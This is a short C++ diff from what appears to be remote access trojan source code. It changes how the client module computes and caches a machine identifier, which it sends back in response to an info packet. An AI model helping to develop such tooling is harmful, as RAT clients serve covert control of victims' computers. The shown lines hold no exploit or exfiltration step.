@@ -22,6 +22,7 @@ Info::~Info() {}
 void Info::OnInit()
 {
 	objID = 0;
+	UID = GetUID();
 }
 
 void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
@@ -75,7 +76,7 @@ void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
 	case INFO_UID:
 		SendBackBuffer = (BYTE*)malloc(5);
 		SendBackBuffer[0] = INFO_UID;
-		*(DWORD*)(SendBackBuffer + 1) = GetUID();
+		*(DWORD*)(SendBackBuffer + 1) = this->UID;
 		sizeOfSendBackBuffer = 5;
 		break;
 	}
@@ -120,6 +121,10 @@ bool Info::GetRATInfo(BYTE* dataBuffer, size_t* dataMaxSize)
 DWORD Info::GetUID()
 {
 	DWORD pid = GetCurrentProcessId();
+	FILETIME fileTime;
+	GetSystemTimeAsFileTime(&fileTime);
+	pid = pid ^ fileTime.dwLowDateTime ^ fileTime.dwHighDateTime;
+
 	HANDLE hToken = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
 		return pid;
